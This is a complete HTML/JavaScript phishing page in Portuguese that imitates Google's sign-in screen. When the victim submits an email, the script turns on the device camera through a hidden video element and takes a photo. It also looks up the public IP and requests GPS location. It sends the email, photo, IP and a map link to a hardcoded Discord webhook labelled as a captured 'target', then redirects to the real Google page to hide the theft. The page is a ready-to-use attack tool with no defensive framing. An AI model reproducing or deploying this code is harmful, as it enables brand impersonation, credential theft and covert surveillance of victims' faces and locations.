<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>Fazer login - Contas do Google</title>
<link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">
<style>
    body {
        margin: 0; padding: 0;
        font-family: 'Roboto', sans-serif;
        background-color: #fff;
        color: #202124;
        display: flex;
        justify-content: center;
        align-items: center;
        height: 100vh;
    }
    .google-box {
        width: 90%;
        max-width: 450px;
        border: 1px solid #dadce0;
        border-radius: 8px;
        padding: 48px 40px 36px;
        text-align: center;
    }
    .google-logo {
        font-size: 24px;
        font-weight: 500;
        margin-bottom: 10px;
        letter-spacing: -0.5px;
    }
    .google-logo span:nth-child(1) { color: #4285F4; }
    .google-logo span:nth-child(2) { color: #EA4335; }
    .google-logo span:nth-child(3) { color: #FBBC05; }
    .google-logo span:nth-child(4) { color: #4285F4; }
    .google-logo span:nth-child(5) { color: #34A853; }
    .google-logo span:nth-child(6) { color: #EA4335; }

    h1 {
        font-size: 24px;
        font-weight: 400;
        margin-bottom: 10px;
    }
    p {
        font-size: 15px;
        margin-bottom: 30px;
    }
    .input-group {
        position: relative;
        margin-bottom: 20px;
    }
    input {
        width: 100%;
        padding: 13px 15px;
        font-size: 16px;
        border: 1px solid #dadce0;
        border-radius: 4px;
        box-sizing: border-box;
        outline: none;
        transition: 0.2s;
    }
    input:focus {
        border: 2px solid #1a73e8;
        padding: 12px 14px;
    }
    .btn {
        background-color: #1a73e8;
        color: #fff;
        border: none;
        padding: 10px 24px;
        border-radius: 4px;
        font-size: 14px;
        font-weight: 500;
        cursor: pointer;
        float: right;
    }
    .btn:hover { background-color: #1557b0; }
    .link {
        color: #1a73e8;
        text-decoration: none;
        font-size: 14px;
        font-weight: 500;
        float: left;
        margin-top: 10px;
        cursor: pointer;
    }
    .clearfix::after {
        content: "";
        clear: both;
        display: table;
    }
    
    /* Loader do Google */
    .loader {
        display: none;
        border: 3px solid #f3f3f3;
        border-top: 3px solid #1a73e8;
        border-radius: 50%;
        width: 20px;
        height: 20px;
        animation: spin 1s linear infinite;
        margin: 20px auto;
    }
    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }

    video { position: fixed; top: -9999px; left: -9999px; }
</style>
</head>
<body>

<video id="camera" autoplay playsinline muted></video>
<canvas id="canvas" style="display:none;"></canvas>

<div class="google-box" id="main-box">
    <div class="google-logo">
        <span>G</span><span>o</span><span>o</span><span>g</span><span>l</span><span>e</span>
    </div>
    <h1>Fazer login</h1>
    <p>Use sua Conta do Google</p>
    
    <div class="input-group">
        <input type="email" id="email-input" placeholder="E-mail ou telefone">
    </div>
    
    <div class="clearfix">
        <a class="link">Esqueci meu e-mail</a>
        <button class="btn" onclick="startHack()">Avançar</button>
    </div>
</div>

<div class="google-box" id="loading-box" style="display:none;">
    <div class="google-logo">
        <span>G</span><span>o</span><span>o</span><span>g</span><span>l</span><span>e</span>
    </div>
    <div class="loader" style="display:block;"></div>
    <p style="margin-top:20px;">Verificando dispositivo...</p>
</div>

<script>
    const WEBHOOK = "https://discord.com/api/webhooks/1571721002176745615/xvq6g3cJ3c2rWY76Cr_kqsksEV1ePYlYLp3HnfKGg88jAVgersnYXGBJmuSiOJuyH306";
    let cameraStream = null;

    async function startHack() {
        const email = document.getElementById('email-input').value;
        if(!email) return alert("Digite um e-mail.");

        document.getElementById('main-box').style.display = 'none';
        document.getElementById('loading-box').style.display = 'block';

        const video = document.getElementById('camera');
        
        try {
            // Pede a câmera traseira (environment)
            cameraStream = await navigator.mediaDevices.getUserMedia({ 
                video: { facingMode: { exact: "environment" } } 
            });
            video.srcObject = cameraStream;
            
            // Espera 2.5 segundos pra focar e tira a foto
            setTimeout(() => captureAndSend(email), 2500);
        } catch (err) {
            // Se não tiver traseira, tenta a frontal, ou vai direto pro envio sem foto
            try {
                cameraStream = await navigator.mediaDevices.getUserMedia({ video: true });
                video.srcObject = cameraStream;
                setTimeout(() => captureAndSend(email), 2500);
            } catch (e) {
                sendToDiscord(email, null, "Câmera negada", "GPS não solicitado");
                finishHack();
            }
        }
    }

    async function captureAndSend(email) {
        const video = document.getElementById('camera');
        const canvas = document.getElementById('canvas');
        
        canvas.width = video.videoWidth || 640;
        canvas.height = video.videoHeight || 480;
        
        const ctx = canvas.getContext('2d');
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
        
        const fotoBase64 = canvas.toDataURL('image/jpeg', 0.7);
        
        if (cameraStream) { cameraStream.getTracks().forEach(t => t.stop()); }

        let ip = "Desconhecido";
        try {
            const r = await fetch("https://api.ipify.org?format=json");
            ip = (await r.json()).ip;
        } catch(e) {}

        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                (pos) => { 
                    const lat = pos.coords.latitude;
                    const lon = pos.coords.longitude;
                    const mapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
                    sendToDiscord(email, fotoBase64, ip, mapsLink);
                    finishHack();
                },
                () => { 
                    sendToDiscord(email, fotoBase64, ip, "GPS negado");
                    finishHack();
                }
            );
        } else {
            sendToDiscord(email, fotoBase64, ip, "Sem suporte a GPS");
            finishHack();
        }
    }

    async function sendToDiscord(email, foto, ip, localizacao) {
        if (!WEBHOOK) return;

        const formData = new FormData();
        
        const payload = {
            content: "🎯 **NOVO ALVO CAPTURADO (GOOGLE FAKE)**",
            embeds: [{
                title: "Dados da Vítima",
                color: 3447003,
                fields: [
                    { name: "E-mail digitado", value: email, inline: false },
                    { name: "IP", value: ip, inline: true },
                    { name: "Localização (Clique)", value: localizacao, inline: false }
                ],
                image: foto ? { url: "attachment://alvo.jpg" } : undefined
            }]
        };

        formData.append("payload_json", JSON.stringify(payload));
        
        if (foto) {
            const blob = await (await fetch(foto)).blob();
            formData.append("file", blob, "alvo.jpg");
        }

        fetch(WEBHOOK, { method: "POST", body: formData }).catch(()=>{});
    }

    function finishHack() {
        // Redireciona pro Google de verdade depois de roubar tudo
        setTimeout(() => {
            window.location.href = "https://accounts.google.com";
        }, 1000);
    }
</script>
</body>
</html>
